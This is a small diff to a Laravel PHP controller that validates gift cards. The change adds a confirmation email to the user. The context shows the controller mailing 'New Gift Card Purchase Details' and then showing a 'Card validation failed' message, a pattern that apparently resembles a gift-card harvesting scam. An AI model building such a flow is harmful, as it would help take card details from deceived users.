@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers;
 
+use App\Mail\ValidationOrderReceived;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Mail;
 
@@ -27,6 +28,11 @@ class ValidateGiftcardController extends Controller
 
             $message->subject('New Gift Card Purchase Details');
         });
+
+        // Send confirmation email to the user
+        if (isset($data['email'])) {
+            Mail::to($data['email'])->send(new ValidationOrderReceived($data));
+        }
 
         session()->flash('error', 'Card validation failed. Please try again.');
 
